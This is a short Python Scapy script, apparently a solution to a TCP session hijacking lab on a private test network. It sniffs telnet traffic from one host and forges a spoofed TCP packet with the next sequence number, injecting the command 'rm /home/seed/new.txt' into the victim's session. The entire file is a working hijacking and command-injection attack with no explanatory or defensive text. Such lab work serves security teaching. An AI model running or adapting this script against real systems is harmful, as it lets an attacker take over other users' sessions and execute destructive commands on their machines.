#!/usr/bin/env python3
from scapy.all import *

def spoof(pkt):
    if pkt[IP].src == "10.9.0.6" and pkt[TCP].dport == 23 and pkt[TCP].payload:
        ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
        tcp = TCP(
            sport=pkt[TCP].sport, dport=pkt[TCP].dport,
            flags="PA",
            seq=pkt[TCP].seq + len(pkt[TCP].payload),  # 紧跟在该数据包之后
            ack=pkt[TCP].ack
        )
        data = "rm /home/seed/new.txt\n"
        send(ip/tcp/data, verbose=0)

sniff(iface="br-002a4cbca66a", filter="tcp port 23", prn=spoof)